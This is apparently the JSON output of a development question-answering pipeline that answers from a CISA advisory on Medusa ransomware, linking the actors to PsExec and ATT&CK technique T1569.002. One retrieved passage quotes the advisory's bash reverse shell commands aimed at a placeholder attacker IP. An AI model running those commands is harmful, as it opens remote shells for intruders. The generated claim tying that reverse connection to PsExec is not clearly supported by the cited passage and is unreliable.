@@ -1,0 +1,104 @@
+{
+  "answer": "Medusa actors use PsExec to move laterally through the network. [E4, E5]\nMedusa actors use PsExec to create a reverse TCP connection to threat actor infrastructure. [E5]\nThe ATT&CK technique connected to Medusa actors through the reported use of PsExec is T1569.002. [E4, E5]\nThe two-hop actor-to-software-to-technique path is: Medusa actors -> PsExec -> T1569.002. [E4, E5]",
+  "claims": [
+    {
+      "text": "Medusa actors use PsExec to move laterally through the network.",
+      "citations": [
+        "E4",
+        "E5"
+      ]
+    },
+    {
+      "text": "Medusa actors use PsExec to create a reverse TCP connection to threat actor infrastructure.",
+      "citations": [
+        "E5"
+      ]
+    },
+    {
+      "text": "The ATT&CK technique connected to Medusa actors through the reported use of PsExec is T1569.002.",
+      "citations": [
+        "E4",
+        "E5"
+      ]
+    },
+    {
+      "text": "The two-hop actor-to-software-to-technique path is: Medusa actors -> PsExec -> T1569.002.",
+      "citations": [
+        "E4",
+        "E5"
+      ]
+    }
+  ],
+  "evidence": {
+    "passages": [
+      {
+        "citation_id": "E1",
+        "doc_id": "AA25-071A",
+        "chunk_id": "retrieval:fc2b809533851678cac583904747bbb2672cbb860cb651a9e444d50b94a5f76f",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a",
+        "text": "\nNote: This advisory uses the MITRE ATT&CK® Matrix for Enterprise framework, version 19. See the MITRE ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques.\nBackground\n(Updated Aug. 18, 2026) Since 2021, Medusa actors have used the Medusa variant to conduct ransomware attacks through at least April 2026. Medusa originally operated as a closed ransomware operation, meaning the same group of cyber threat actors controlled all development and associated ransomware campaigns. Since at least early 2023, Medusa progressed to using an affiliate model, selling RaaS to affiliates who are granted varying levels of trust based upon experience and profitability. For newer or less experienced affiliates, important operations such as ransom negotiation may be centrally controlled by the developers. Medusa actors use a double-extortion model where they encr",
+        "start": 4851,
+        "end": 5796,
+        "source_kind": "cisa"
+      },
+      {
+        "citation_id": "E2",
+        "doc_id": "AA25-071A",
+        "chunk_id": "retrieval:fc2b809533851678cac583904747bbb2672cbb860cb651a9e444d50b94a5f76f",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a",
+        "text": "#StopRansomware: Medusa Ransomware",
+        "start": 23,
+        "end": 57,
+        "source_kind": "cisa"
+      },
+      {
+        "citation_id": "E3",
+        "doc_id": "AA25-071A",
+        "chunk_id": "retrieval:fc2b809533851678cac583904747bbb2672cbb860cb651a9e444d50b94a5f76f",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a",
+        "text": "Technical Details",
+        "start": 4834,
+        "end": 4851,
+        "source_kind": "cisa"
+      },
+      {
+        "citation_id": "E4",
+        "doc_id": "AA25-071A",
+        "chunk_id": "retrieval:4615a02d5a22dfb14c804fb7df0549739ac24246bf1c3c39525f053215db18b2",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a",
+        "text": "-able, BeyondTrust, SimpleHelp, and Splashtop. Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and PsExec [T1569.002]—to move laterally [TA0008] through the network and identify files for exfiltration [TA0010] and encryption [T1486]. When provided with valid username and password credentials, Medusa actors use PsExec to:\n",
+        "start": 14152,
+        "end": 14519,
+        "source_kind": "cisa"
+      },
+      {
+        "citation_id": "E5",
+        "doc_id": "AA25-071A",
+        "chunk_id": "retrieval:6bdb5fad270ade25cb06e52322202a2857319e99bda1e9b4d8fc511b4aa852b3",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a",
+        "text": "commands to create a reverse Transmission Control Protocol (TCP) connection to threat actor infrastructure:\nbash -i >& /dev/tcp/<attacker IP>/4444 0>&1\nbash -i >& /dev/tcp/<attacker IP>/443 0>&1\nGSocket\nAlso known as Global Socket or gs-netcat.\nAllows workstations on different private networks to connect and bypass firewalls.\nAllows file transfers and command execution.\nLateral Movement, Credential Access, and Execution\n(Updated Aug. 18, 2026) Medusa actors use a variety of legitimate remote monitoring and management (RMM) software [T1219]. To evade detection, they may tailor their choice based on remote access tools already present in the victim environment. 2,3 FBI identified Medusa actors using remote access software AnyDesk, Atera, ConnectWise, eHorus, N-able, BeyondTrust, SimpleHelp, and Splashtop. Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and Ps",
+        "start": 13384,
+        "end": 14297,
+        "source_kind": "cisa"
+      }
+    ],
+    "paths": [],
+    "citation_ids": [
+      "E1",
+      "E2",
+      "E3",
+      "E4",
+      "E5"
+    ],
+    "retrieval_ms": 12.942699977429584,
+    "configuration_hash": "fb3bca230c45e4ecdb2fdaf776826d2f60d68182c76c16cb4da564aad97521f7",
+    "corpus_version": "cisa-selected-2026-10-03"
+  },
+  "abstained": false,
+  "execution_time_ms": 2669.3555999954697,
+  "generation_timestamp": "2026-10-16T05:08:27.850610Z",
+  "warnings": [
+    "Development text_only pipeline; final evaluation remains pending.",
+    "Source checks passed; generated-answer semantics require human review."
+  ]
+}
